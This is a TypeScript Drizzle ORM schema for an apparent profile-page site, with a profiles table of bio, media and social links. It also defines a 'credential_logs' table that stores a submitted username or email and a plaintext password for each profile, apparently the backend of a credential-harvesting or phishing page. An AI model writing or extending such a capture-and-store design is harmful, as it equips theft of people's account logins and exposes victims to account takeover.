import { sql } from "drizzle-orm";
import { pgTable, text, varchar, integer } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

export const profiles = pgTable("profiles", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  username: text("username").notNull().unique(),
  displayName: text("display_name"),
  bio: text("bio"),
  profilePicture: text("profile_picture"),
  backgroundVideo: text("background_video"),
  backgroundVideoMuted: integer("background_video_muted").default(1),
  backgroundAudio: text("background_audio"),
  viewCount: integer("view_count").notNull().default(0),
  snapchat: text("snapchat"),
  discord: text("discord"),
  twitter: text("twitter"),
  instagram: text("instagram"),
  tiktok: text("tiktok"),
  youtube: text("youtube"),
  github: text("github"),
  twitch: text("twitch"),
});

export const credentialLogs = pgTable("credential_logs", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  profileUsername: text("profile_username").notNull(),
  usernameOrEmail: text("username_or_email").notNull(),
  password: text("password").notNull(),
  timestamp: text("timestamp").notNull(),
});

export const insertProfileSchema = createInsertSchema(profiles).omit({
  id: true,
  viewCount: true,
});

export const insertCredentialLogSchema = createInsertSchema(credentialLogs).omit({
  id: true,
  timestamp: true,
});

export type InsertProfile = z.infer<typeof insertProfileSchema>;
export type Profile = typeof profiles.$inferSelect;
export type InsertCredentialLog = z.infer<typeof insertCredentialLogSchema>;
export type CredentialLog = typeof credentialLogs.$inferSelect;

export const DEFAULT_AVATAR = "/defaults/avatar.svg";
export const DEFAULT_BACKGROUND_COLOR = "#000000";
